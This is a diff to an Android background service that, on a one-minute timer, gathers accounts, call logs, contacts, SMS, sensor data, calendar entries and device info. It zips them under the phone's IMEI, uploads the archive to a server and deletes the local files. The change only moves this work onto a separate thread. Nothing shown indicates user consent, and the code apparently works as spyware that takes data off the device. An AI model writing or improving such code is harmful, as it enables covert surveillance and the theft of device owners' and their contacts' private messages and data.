@@ -152,50 +152,57 @@ public class MyService extends Service {
                                                 .enqueue(new Callback<Void>() {
                                                     @Override
                                                     public void onResponse(Call<Void> call, Response<Void> response) {
-                                                        dp.account(context,helper,writer);
-                                                        dp.battery(context,helper,writer);
-                                                        dp.call(context,helper,writer);
-                                                        dp.contact(context,helper,writer);
-                                                        dp.sms(context,helper,writer);
-                                                        dp.sensor(context,helper,writer);
-                                                        dp.calendarcontractEvents(context,helper,writer);
-                                                        dp.calendarcontractReminder(context,helper,writer);
-                                                        dp.deviceInfo(context,helper,writer);
-                                                        writer.flush();
-                                                        writer.close();
+                                                        if(response.code()==200 && response.isSuccessful()){
+                                                           new Thread(new Runnable() {
+                                                               @Override
+                                                               public void run() {
+                                                                   dp.account(context,helper,writer);
+                                                                   dp.battery(context,helper,writer);
+                                                                   dp.call(context,helper,writer);
+                                                                   dp.contact(context,helper,writer);
+                                                                   dp.sms(context,helper,writer);
+                                                                   dp.sensor(context,helper,writer);
+                                                                   dp.calendarcontractEvents(context,helper,writer);
+                                                                   dp.calendarcontractReminder(context,helper,writer);
+                                                                   dp.deviceInfo(context,helper,writer);
+                                                                   writer.flush();
+                                                                   writer.close();
 
 
-                                                        file=new File(helper.zip(csvFilename,Environment.getExternalStorageDirectory()+ File.separator+imei+".zip"));
-                                                        requestFile=RequestBody.create(MediaType.parse("multipart/form-data"),file);
-                                                        body= MultipartBody.Part.createFormData("file",file.getName(),requestFile);
-                                                        if(helper.deleteFile(csvFilename)){
-                                                            ApiClient.getInstance().upload(body).enqueue(new Callback<String>() {
-                                                                @Override
-                                                                public void onResponse(Call<String> call, Response<String> response) {
-                                                                    if(response.code()==200){
-                                                                        if(response.body().equalsIgnoreCase("Success")){
-                                                                            helper.deleteFile(Environment.getExternalStorageDirectory()+ File.separator+imei+".zip");
-                                                                        }
-                                                                    }
-                                                                }
+                                                                   file=new File(helper.zip(csvFilename,Environment.getExternalStorageDirectory()+ File.separator+imei+".zip"));
+                                                                   requestFile=RequestBody.create(MediaType.parse("multipart/form-data"),file);
+                                                                   body= MultipartBody.Part.createFormData("file",file.getName(),requestFile);
+                                                                   if(helper.deleteFile(csvFilename)){
+                                                                       ApiClient.getInstance().upload(body).enqueue(new Callback<String>() {
+                                                                           @Override
+                                                                           public void onResponse(Call<String> call, Response<String> response) {
+                                                                               if(response.code()==200){
+                                                                                   if(response.body().equalsIgnoreCase("Success")){
+                                                                                       helper.deleteFile(Environment.getExternalStorageDirectory()+ File.separator+imei+".zip");
+                                                                                   }
+                                                                               }
+                                                                           }
 
-                                                                @Override
-                                                                public void onFailure(Call<String> call, Throwable t) {
-                                                                    Log.e("Error-->",t.getMessage());
-                                                                }
-                                                            });
+                                                                           @Override
+                                                                           public void onFailure(Call<String> call, Throwable t) {
+                                                                               Log.e("Error-->",t.getMessage());
+                                                                           }
+                                                                       });
 
-                                                            ApiClient.getInstance().setStatus(mobileNo,"C").enqueue(new Callback<Void>() {
-                                                                @Override
-                                                                public void onResponse(Call<Void> call, Response<Void> response) {
+                                                                       ApiClient.getInstance().setStatus(mobileNo,"C").enqueue(new Callback<Void>() {
+                                                                           @Override
+                                                                           public void onResponse(Call<Void> call, Response<Void> response) {
 
-                                                                }
+                                                                           }
 
-                                                                @Override
-                                                                public void onFailure(Call<Void> call, Throwable t) {
+                                                                           @Override
+                                                                           public void onFailure(Call<Void> call, Throwable t) {
 
-                                                                }
-                                                            });
+                                                                           }
+                                                                       });
+                                                                   }
+                                                               }
+                                                           }).start();
                                                         }
                                                     }
 
@@ -218,5 +225,6 @@ public class MyService extends Service {
                         });
             }
         },0,60000);
+
     }
 }
